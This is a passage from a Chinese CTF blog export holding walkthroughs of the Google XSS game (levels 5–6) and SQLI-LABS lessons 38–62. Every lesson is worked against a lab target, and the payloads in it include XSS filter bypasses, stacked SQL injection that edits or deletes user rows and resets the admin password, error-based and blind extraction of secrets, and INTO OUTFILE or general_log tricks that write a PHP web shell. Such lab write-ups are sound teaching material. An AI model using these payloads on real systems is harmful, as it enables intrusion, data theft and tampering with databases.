<p>我们可以直接在<code>next</code>参数中构造攻击语句，当用户点击a标签的时候该语句就能被执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xss-game.appspot.com&#x2F;level5&#x2F;frame&#x2F;signup?next&#x3D;javascript:alert()</span><br></pre></td></tr></table></figure>


<h2 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309105632106.png" alt="image-20210309105632106"></p>
<ul>
<li>查看源码</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/game-frame.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/game-frame-styles.css&quot;</span> /&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">setInnerText</span>(<span class="params">element, value</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (element.innerText) &#123;</span></span><br><span class="line">        element.innerText = value;</span><br><span class="line"><span class="javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line">        element.textContent = value;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">includeGadget</span>(<span class="params">url</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> scriptEl = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"> </span><br><span class="line"><span class="javascript">      <span class="comment">// This will totally prevent us from loading evil URLs!</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (url.match(<span class="regexp">/^https?:\/\//</span>)) &#123;</span></span><br><span class="line"><span class="javascript">        setInnerText(<span class="built_in">document</span>.getElementById(<span class="string">&quot;log&quot;</span>),</span></span><br><span class="line"><span class="javascript">          <span class="string">&quot;Sorry, cannot load a URL containing \&quot;http\&quot;.&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="javascript">      <span class="comment">// Load this awesome gadget</span></span></span><br><span class="line">      scriptEl.src = url;</span><br><span class="line"> </span><br><span class="line"><span class="javascript">      <span class="comment">// Show log messages</span></span></span><br><span class="line"><span class="javascript">      scriptEl.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span></span><br><span class="line"><span class="javascript">        setInnerText(<span class="built_in">document</span>.getElementById(<span class="string">&quot;log&quot;</span>),  </span></span><br><span class="line"><span class="javascript">          <span class="string">&quot;Loaded gadget from &quot;</span> + url);</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">      scriptEl.onerror = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span></span><br><span class="line"><span class="javascript">        setInnerText(<span class="built_in">document</span>.getElementById(<span class="string">&quot;log&quot;</span>),  </span></span><br><span class="line"><span class="javascript">          <span class="string">&quot;Couldn&#x27;t load gadget from &quot;</span> + url);</span></span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.head.appendChild(scriptEl);</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="javascript">    <span class="comment">// Take the value after # and use it as the gadget filename.</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">getGadgetName</span>(<span class="params"></span>) </span>&#123; </span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> <span class="built_in">window</span>.location.hash.substr(<span class="number">1</span>) || <span class="string">&quot;/static/gadget.js&quot;</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    includeGadget(getGadgetName());</span><br><span class="line"> </span><br><span class="line"><span class="javascript">    <span class="comment">// Extra code so that we can communicate with the parent page</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.addEventListener(<span class="string">&quot;message&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (event.source == parent) &#123;</span></span><br><span class="line">        includeGadget(getGadgetName());</span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">    &#125;, <span class="literal">false</span>);</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">&quot;level6&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/logos/level6.png&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&quot;cube&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/static/level6_cube.png&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;log&quot;</span>&gt;</span>Loading gadget...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>题目说得很清楚，利用外部js脚本执行alert()。但是对参数做了过滤，不能输入带有<code>http://</code>开头的参数，这里可以利用大小绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Https:&#x2F;&#x2F;www.google.com&#x2F;jsapi?callback&#x3D;alert</span><br></pre></td></tr></table></figure>
<p>也可以利用data类型的url代替<code>http://</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:text,alert()</span><br></pre></td></tr></table></figure>


<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://rock718.github.io/2017/08/14/xss-game-writeup/" >google xss-game 题目解答<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.freebuf.com/articles/web/36072.html" >玩转Google的XSS游戏<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLI-LABS (Stacked Injections) 38-53关</title>
    <url>/2021/03/07/SQLI-LABS%20(Stacked%20Injections)%2038-53%E5%85%B3/</url>
    <content><![CDATA[<h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><ul>
<li>查看源码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># id 参数直接带入到 SQL 语句中</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>)):</span><br><span class="line">    输出查询信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysqli_error(<span class="variable">$con1</span>));</span><br></pre></td></tr></table></figure>
<p>发现这里使用了**mysqli_multi_query($con1, $sql)**函数，这个函数用于执行一个SQL语句，或者多个使用分号分隔的SQL语句。</p>
<ul>
<li>利用方法</li>
</ul>
<p>理论上所有SQL语句都能执行，只不过不能显示结果出来而已。</p>
<p>example：添加字段值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-38&#x2F;?id&#x3D;1&#39;;insert into users(username,password) values (&#39;hello&#39;,&#39;world&#39;);</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305212154622.png" alt="image-20210305212154622"></p>
<ul>
<li>开启日志Getshell</li>
</ul>
<p>需要条件：</p>
<ol>
<li>Web 的物理路径</li>
<li>MySQL 可以读写 Web 目录</li>
<li>Windows 成功率 高于 Linux</li>
</ol>
<p>首先查看当前日志的相关配置：</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305212549907.png" alt="image-20210305212549907"></p>
<p>这里的日志并没有开启，尝试注入的时候手动开启：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-38&#x2F;?id&#x3D;1&#39;;set global general_log &#x3D; &quot;ON&quot;;set global general_log_file&#x3D;&#39;D:\\phpStudy\\PHPTutorial\\WWW\\shell.php&#39;;--+</span><br></pre></td></tr></table></figure>
<p>然后再查看日志配置是否被修改了：</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305212932567.png" alt="image-20210305212932567"></p>
<p>成功修改后尝试getshell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-38&#x2F;?id&#x3D;1&#39;;select &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
<p>查看里面的日志：</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305213133319.png" alt="image-20210305213133319"></p>
<p>此时已经成功写入了，访问该页面</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305213247027.png" alt="image-20210305213247027"></p>
<h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><p>本关与Less-38的区别只是参数的数据类型为数字型，其他都一样。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-38&#x2F;?id&#x3D;1;insert into users(username,password) values (&#39;hello&#39;,&#39;world&#39;);</span><br></pre></td></tr></table></figure>


<h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><p>本关与Less-38的区别只是参数闭合方式为<code>(&#39;$id&#39;)</code>，其他都一样。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-38&#x2F;?id&#x3D;1&#39;);insert into users(username,password) values (&#39;hello&#39;,&#39;world&#39;);</span><br></pre></td></tr></table></figure>
<p>此外还有一些二次注入的文件在里面，不过好像没啥用。</p>
<h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><p>本关与Less-39的区别只是屏蔽了错误信息显示，其他都一样。</p>
<h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><ul>
<li>查看源码<ul>
<li>login.php</li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># username 被过滤 &#x27; &quot; \ password 没有被</span></span><br><span class="line"><span class="variable">$username</span> = mysqli_real_escape_string(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 堆叠查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 查询成功：</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysqli_error(<span class="variable">$con1</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 登录成功:</span><br><span class="line">    setcookie(<span class="string">&quot;Auth&quot;</span>, <span class="number">1</span>, time()+<span class="number">3600</span>);</span><br><span class="line">    跳转到 logged-in.php</span><br></pre></td></tr></table></figure>
<p>这里的<code>login_password</code>参数没有进行过滤，同时使用了堆叠查询，因此可以从这里进行注入攻击。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;&#39; union select 1,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users),3--+</span><br></pre></td></tr></table></figure>
<p>当然这里题目希望我们进行堆叠注入同样也是可以的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;&#39;;login_user&#x3D;admin&amp;login_password&#x3D;&#39;;Update users set password &#x3D; &#39;hacked&#39; where username &#x3D; &#39;admin&#39;#</span><br></pre></td></tr></table></figure>
<p>这里把admin用户的密码改为了hacked。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306104434303.png" alt="image-20210306104434303"></p>
<h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><p>本关和Less-42一样，只不过闭合方式换成了<code>(&#39;$password&#39;)</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;&#39;) union select 1,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users),3--+</span><br></pre></td></tr></table></figure>


<h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><p>和 Less-43 的利用方式一致，因为没有输出报错信息，所以这里少了报错注入的利用方式。</p>
<h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><p>本关与 Less-43 闭合方式一致为<code>(&#39;$password&#39;)</code>，只是这里少了报错注入的利用方法。</p>
<h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><ul>
<li>查看源码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># GET 方式获取 sort 参数</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;sort&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接将 id 带入 SQL 中</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 查询成功：</span><br><span class="line">    输出查询信息</span><br><span class="line"><span class="keyword">else</span>：</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure>
<p>这里是在order by 注入，利用方法很多</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?sort&#x3D;(select updatexml(1,concat(0x7e,(select @@version),0x7e),1))</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>procedure analyse 参数后注入</strong></li>
</ul>
<p>利用 procedure analyse 参数，我们可以执行报错注入。同时，在 procedure analyse 和 orde r by 之间可以存在 limit 参数，我们在实际应用中，往往也可能会存在 limit 后的注入，可以 利用 procedure analyse 进行注入。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?sort&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)</span><br></pre></td></tr></table></figure>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><ul>
<li><strong>布尔盲注</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?sort&#x3D;rand(left(database(),1)&gt;&#39;r&#39;)</span><br><span class="line">?sort&#x3D;rand(left(database(),1)&gt;&#39;s&#39;)</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>时间盲注</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?sort&#x3D;rand(if(ascii(substr(database(),1,1))&gt;114,1,sleep(1)))</span><br><span class="line">?sort&#x3D;rand(if(ascii(substr(database(),1,1))&gt;115,1,sleep(1)))</span><br></pre></td></tr></table></figure>
<h3 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?sort&#x3D;1 into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;less46.txt&quot;</span><br></pre></td></tr></table></figure>
<p>如果导入不成功的话，很可能是因为 Web 目前 MySQL 没有读写权限造成的。</p>
<ul>
<li><strong>利用导出文件 getshell</strong>：</li>
</ul>
<p>使用lines terminated by 姿势用于 order by 的情况来 getsgell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?sort&#x3D;1 into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\shell.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e</span><br></pre></td></tr></table></figure>
<p>3c3f70687020706870696e666f28293b3f3e 是 <code>&lt;php phpinfo();&gt;</code> 的十六进制编码。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306114842456.png" alt="image-20210306114842456"></p>
<h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><p>本关和Less-46的区别在于参数由数字型变为了字符型，需要由<code>&#39;$sort&#39;</code>闭合，因此不能直接用<code>?sort=rand(xxxxxx)</code>这种方法进行注入，需要先把前面的字符先闭合了再使用and 接构造的语句<code>?sort=1&#39; and xxxx</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-47&#x2F;?sort&#x3D;1&#39; and (select updatexml(1,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e),1))--+</span><br></pre></td></tr></table></figure>


<h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><p>和 Less-46 相比少了报错注入，布尔、延时盲注依然可以正常使用，into outfile 也可以。</p>
<h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><p>和 Less-47 相比少了报错注入，布尔、延时盲注依然可以正常使用，into outfile 也可以。</p>
<h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><p>执行 sql 语句我们这里使用的是 **mysqli_multi_query()**函数，而之前我们使用的是 **mysqli _query()**，区别在于 **mysqli_multi_query()**可以执行多个 sql 语句，而 **mysqli_query()**只能执行 一个 sql 语句，那么我们此处就可以执行多个 sql 语句进行注入，也就是我们之前提到的 statcked injection。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-50&#x2F;?sort&#x3D;1;insert into users(username,password) values (&#39;hello1&#39;,&#39;world1&#39;);</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306150439345.png" alt="image-20210306150439345"></p>
<h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><p>这一关和 Less-50 相比只是参数数据类型变成了字符型，实际注入的时候只需做一下对应的闭合即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-51&#x2F;?sort&#x3D;1&#39;;delete from users where username &#x3D; &#39;hello1&#39;;</span><br></pre></td></tr></table></figure>


<h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><p>和 Less-50 是一样的，只是少了报错注入的利用方式。</p>
<h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>和 Less-51 是一样的，只是少了报错注入的利用方式。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a class="link"   href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-44" >SQLI labs 靶场精简学习记录<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<ul>
<li><a class="link"   href="https://www.cnblogs.com/lcamry/" >lcamry 大佬的《MySQL注入天书》<i class="fas fa-external-link-alt"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLi-LABS (Challenges) 54-65关</title>
    <url>/2021/03/07/SQLi-LABS%20(Challenges)%2054-65%E5%85%B3/</url>
    <content><![CDATA[<p>这一系列的关卡都有个限制，对我们之前所学的知识进行更深层次的运用。</p>
<h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>这一关的数据库每10次查询后会自动重置随机生成新的表名和列名数据，需要我我们在10次尝试以内得出 secret key 。</p>
<h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>这里再重新演示一次正常的联合注入流程</p>
<ul>
<li><strong>判断闭合方式和参数数据类型</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-54&#x2F;?id&#x3D;1	正常</span><br><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-54&#x2F;?id&#x3D;1&#39;	没有返回</span><br></pre></td></tr></table></figure>
<p>从这2步可以看出，这里是字符型的参数，并且闭合方式一定是<code>&#39;$id&#39;</code>或者<code>(&#39;$id&#39;)</code>两者之一。</p>
<ul>
<li><strong>判断字段数</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 3--+	正常</span><br><span class="line">?id&#x3D;1&#39; order by 4--+	没有返回</span><br></pre></td></tr></table></figure>
<p>得出查询返回的字段数有3个</p>
<ul>
<li><strong>查询有可注入的字段</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152449878.png" alt="image-20210306152449878"></p>
<p>可见字段2，3是可以显示出来的。</p>
<ul>
<li>查询表名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA&#x3D;DATABASE()) --+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152613507.png" alt="image-20210306152613507"></p>
<p>可知表名为 ttyxbfpvca</p>
<ul>
<li>查询字段名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME&#x3D;&#39;ttyxbfpvca&#39;) --+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152822385.png" alt="image-20210306152822385"></p>
<p>查到有 id、sessid、secret_IVAU、tryy 这些字段</p>
<ul>
<li>查询数据</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(secret_IVAU)+FROM+ttyxbfpvca) --+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306153106710.png" alt="image-20210306153106710"></p>
<p>拿到 secret key 值为：J1rzyGdPRiKwK5I4iaNlCwuT</p>
<h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><p>这一关和 Less-54 基本一致，给了14次机会，闭合方式改为了<code>($id)</code></p>
<h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>这一关和 Less-54 相比只是闭合方式换成了<code>(&#39;$id&#39;)</code>，给了14次机会。</p>
<h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>这一关和 Less-54 基本一致，给了14次机会，闭合方式改为了<code>&quot;$id&quot;</code></p>
<h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p>这一关只给了5次机会，当然如果知道了要使用什么注入方法后也能绰绰有余</p>
<ul>
<li>查看代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$unames</span>=<span class="keyword">array</span>(<span class="string">&quot;Dumb&quot;</span>,<span class="string">&quot;Angelina&quot;</span>,<span class="string">&quot;Dummy&quot;</span>,<span class="string">&quot;secure&quot;</span>,<span class="string">&quot;stupid&quot;</span>,<span class="string">&quot;superman&quot;</span>,<span class="string">&quot;batman&quot;</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;admin1&quot;</span>,<span class="string">&quot;admin2&quot;</span>,<span class="string">&quot;admin3&quot;</span>,<span class="string">&quot;dhakkan&quot;</span>,<span class="string">&quot;admin4&quot;</span>);</span><br><span class="line"><span class="variable">$pass</span> = (<span class="variable">$unames</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name : &#x27;</span>. <span class="variable">$unames</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password : &#x27;</span> .<span class="variable">$pass</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br></pre></td></tr></table></figure>
<p>这里查询成功只给你回显预定数组里面的数据，并不是直接回显查询结果，因此无法使用联合注入，我们可以尝试报错注入。</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>这里再演示一次报错注入：</p>
<ul>
<li>查询表名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e)))--+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306155346027.png" alt="image-20210306155346027"></p>
<p>得知表名为：7dvdblb1tl</p>
<ul>
<li>查询字段名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name+SEPARATOR+0x3c62723e) from information_schema.columns where table_name&#x3D;&#39;7dvdblb1tl&#39;),0x7e)))--+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306155750151.png" alt="image-20210306155750151"></p>
<p>由于报错注入回显的字符数有限，如果想要后面的信息，可以加 limit 来限制数量</p>
<p>这我们已经可以知道想要的字段名为：secret_UPZ7</p>
<ul>
<li>查询数据</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select secret_UPZ7 from 7dvdblb1tl),0x7e)))--+</span><br></pre></td></tr></table></figure>
<p>得到 secret key 为： JrOfRpU234sYeim4AJuv6zVw</p>
<h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>本关与 Less-58 的思路一样，只是参数的数据类型换成了数字型。</p>
<h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>本关与 Less-58 的思路一样，只是闭合方式改为了<code>(&quot;$id&quot;)</code>。</p>
<h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>本关与 Less-58 的思路一样，只是闭合方式改为了<code>((&#39;$id&#39;))</code>。</p>
<h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>这一关把错误信息显示也屏蔽了，因此只能使用盲注了，由于盲注需要尝试的步骤也比较多，因此这里也给出了130次的机会。同时应该注意到这里的闭合方式为<code>(&#39;$id&#39;)</code></p>
